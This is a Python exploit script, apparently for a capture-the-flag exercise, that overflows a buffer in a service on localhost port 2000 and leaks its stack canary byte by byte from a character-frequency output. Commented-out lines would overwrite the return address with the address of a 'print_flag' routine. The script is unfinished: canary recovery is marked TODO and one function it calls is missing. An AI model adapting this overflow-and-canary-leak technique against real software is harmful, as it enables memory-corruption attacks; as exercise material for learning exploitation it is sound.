#!/usr/bin/python3

import socket
import telnetlib



ENTER = '\n'
REPEAT_CHAR = b'\x00'
CANARY_SIZE = 0x10



def connect_and_send(data_count, data):
    sock = socket.create_connection(('localhost', 2000))
    count_to_send = str(data_count)
    count_to_send += ENTER

    data_to_send = data
    data_to_send += ENTER.encode('ASCII')

    telnet = telnetlib.Telnet()
    telnet.sock = sock
    result = ''
    for i in range(0, 2):
        sock.send(count_to_send.encode('ASCII'))
        sock.send(data_to_send)
        recv = sock.recv(1024).decode('ASCII')
        while(recv):
            result += recv
            recv = sock.recv(1024).decode('ASCII')
        telnet.interact()
        print(result)


    sock.close()
    return result



def find_distribution(n):
    '''
        Gets the character distribution of the buffer + the last n bytes of the canary
    '''
    data_count = 0x418

    repeat = 0x408 + CANARY_SIZE - 1
    repeat -= n
    data = REPEAT_CHAR * repeat   # overwrite buffer
    # data += b'B'*0x10   # overwrite base pointer and stuff
    # data += 0x40188d.to_bytes(8, 'little')  # set return address to print_flag

    result = connect_and_send(data_count, data)
    return parse_distribution(result)



def parse_distribution(output):
    result = {}
    lines = output.strip().split('\n')

    for line in lines:
        columns = line.split()

        if(columns[0][0].isdigit()):
            count = int(columns[1])

            if count != 0:
                byte = chr(int(columns[0])).encode('latin-1')
                result[byte] = count

    return result



def find_canary():
    # TODO: iterate from 1 to CANARY_SIZE and keep sending and getting back frequences
    # Remember frequencies and figure out what new character has appeared (back to front)
    # Collect all characters as bytes or something
    canary = b''
    distribution = find_distribution(0)
    print(canary)
    print(distribution)
    for i in range(1, CANARY_SIZE):
        # distribution = find_distribution(i)
        print(distribution)
        new_distribution = find_distribution(i)
        for byte in new_distribution:
            if (byte != REPEAT_CHAR):
                if (byte not in distribution or distribution[byte] != new_distribution[byte]):
                    print('Found byte with new distribution: ' + str(byte) + '->' + str(new_distribution[byte]))
                    canary = byte + canary
        print(canary)
        distribution = new_distribution
    return canary


find_distribution(0)

# TODO: find canary, then send and overwrite it
# canary = find_canary()
# print(canary)
# print(parse_lines(result)[ord(REPEAT_CHAR)])

